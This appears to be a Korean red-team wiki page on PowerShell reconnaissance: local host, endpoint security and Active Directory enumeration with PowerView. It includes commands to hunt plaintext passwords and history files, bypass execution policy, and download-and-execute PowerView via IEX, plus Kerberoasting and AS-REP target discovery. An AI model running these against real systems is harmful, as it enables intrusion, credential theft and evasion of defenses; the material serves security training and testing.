# 정보 수집 - 파워쉘

로컬 호스트 정보 수집 페이지에서도 잠깐 언급했지만, cmd 및 파워쉘을 통한 정보 수집은 레드팀 작전의 작전보안에 적합하지 않다.&#x20;

그러나 레드팀을 제외하고 모의해킹, 그리고 블루팀의 엔드포인트 감사/테스팅에서 파워쉘을 여전히 많이 쓰이고 있다. 따라서 아주 소수의, 고급 APT 공격 시뮬레이션을 하는 레드팀을 제외한다면 CMD 파워쉘을 통한 정보 수집은 아직도 많이 사용된다. 따라서 이 페이지에서는 파워쉘을 통한 로컬/도메인 정보 수집에 대해서 알아본다.&#x20;



### 로컬&#x20;

#### 기본&#x20;

* 유저, 그룹, 호스트이름, 네트워킹, 프로세스 리스 등의 간단한 기본 정보를 수집한다.&#x20;

```
# 유저 및 그룹 
whoami 
net user 
net users
net localgroups 
net group /domain 
net localgroup Administrators

# 프로세스 
ps 
Get-Process
tasklist.exe /V
wmic process get ProcessId,Description,ParentProcessId,ReadOperationCount,WriteOperationCount

# 호스트 이름 
hostname

# 네트워킹 - layer 2,3 
ipconfig /all 
route print
arp -a 

# 도메인 이름 
Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Name, Domain
$env:USERDOMAIN

# OS 버전과 핫픽스 존재여부 
systeminfo 
Get-HotFix

# 파워쉘 세션 ID 확인. 0 = NT 서비스/시스템, 1++ = 유저 
(Get-Process -PID $pid).SessionID
```

#### 엔드포인트 보안&#x20;

* AV/EDR 솔루션, AMSI, .NET 버전 (4.8+ = .NET AMSI), Applocker, Credential Guard, 파워쉘 Constrained Language Mode, 파워쉘 version 2, 로컬 방화 등의 엔드포인트 보안과 관련된 정보를 수집한다.

```
# 방화벽 
Get-NetFirewallProfile | Select-Object -Property name,enabled,DefaultInboundAction,DefaultOutboundAction,LogFileName

# AV/EDR 솔루션 
Get-Process 
wmic process get ProcessId,Description,ParentProcessId,ReadOperationCount,WriteOperationCount

# AV/EDR 이 없다면 디펜더 체크 
get-mppreference | select DisableRealtimeMonitoring 

# AMSI - 활성화 되어 있을 때 
Invoke-Mimikatz 
This script contains malicious content and has been blocked by your antivirus software.

# AMSI - 비활성화 
Invoke-Mimikatz 
invoke-mimikatz : The term 'invoke-mimikatz' is not recognized as the name of a cmdlet, function, script file, or operable program.

# .NET Version 
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name version -EA 0 | Where { $_.PSChildName -Match '^(?!S)\p{L}'} | Select PSChildName, version

# Powershell CLM (Contrained Language Mode) 
$ExecutionContext.SessionState.LanguageMode

# Powershell Version 2
powershell.exe -v 2

# Credential Guard 
(Get-ComputerInfo).DeviceGuardSecurityServicesConfigured

# Applocker - Local, Default Domain policy 
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Applocker - Local registry 
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\ -Recurse

# 파워쉘 ExecutionPolicy 확인 및 Bypass 로 설정 
Get-ExecutionPolicy -List
$env:PSExecutionPolicyPreference="bypass"

```

#### 간단 정보 수집&#x20;

```
# txt, xml, ini 파일안의 평문 비밀번호 
findstr /si password *.txt | *.xml | *.ini

# 파워쉘 히스토리 powershell history 
echo $env:userprofile 
cat %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# 데브옵스 및 배포 파일 
c:\sysprep.ini
c:\sysprep\sysprep.xml 
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```



### 액티브 디렉토

* 파워쉘을 통한 도메인 정보 수집은 PowerView.ps1 와 같은 툴을 이용하거나 [MS-ActiveDirectory Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) 을 이용한다. MS AD 모듈의 경우 설치되어 있지 않은 호스트들도 많기 때문에 Powerview 등의 툴을 많이 사용하는 편이다.&#x20;
* Powerview 등의 파워쉘 기반의 도메인 정보 수집 툴을 이용하려면 [AMSI 우회](../defense-evasion/amsi-bypass.md)를 해야한다.&#x20;
* 다음은 Powerview 기반의 정보 수집 명령어들이다.

```
# AMSI 우회 
< AMSI 우회 페이지를 참고한다 > 

# PowerView 로드 - BCSecurity - 최신이지만 에러 존재 
IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1')

# PowerView 로드 - HarmJoy 의 원본 PowerView 
iex(New-Object net.webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')

# 도메인  
Get-Domain
Get-DomainController -Domain <도메인>

# 도메인 신뢰/관계
Get-DomainTrust

# 포레스트
Get-Forest -Forest <포레스트이름>

# 도메인 유저 
Get-DomainUser | Select-Object samaccountname
Get-DomainUser | select-object samaccountname,description

# 커버로스팅 가능한 유저 
Get-DomainUser -SPN | Select-Object name,serviceprincipalname
Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName

# AS-Rep 가능한 유저 
Get-DomainUser -PreauthNotRequired | select-object name 

# 도메인 그룹 
Get-DomainGroup | Select-Object name

# 특정 그룹의 유저 
Get-DomainGroupMember -Identity "<그룹이름>" -Recurse | Select-Object -Property GroupName,MemberName | Format-Table

# 도메인 컴퓨터 
Get-DomainComputer -Domain <도메인> | Select-Object dnshostname
Get-DomainComputer -Domain <도메인> | Select-Object dnshostname | %{Test-Connection -count 1 -ComputerName $_.dnshostname} *>&1

# 도메인 GPO 
Get-DomainGPO | Select-Object displayname

# 잠재적 허니팟 (honeypot) 유저 
Get-DomainUser | select-object cn,pwdlastset,badpwdcount,logoncount

# 현 유저가 로컬 관리자 권한을 갖고 있는 호스트 
Find-LocalAdminAccess -Domain <도메인>

# 도메인 내 공유된 폴더 
Find-DomainShare -Domain <도메인>

# Unconstrained Delegation 호스트 
Get-DomainComputer -Unconstrained
```



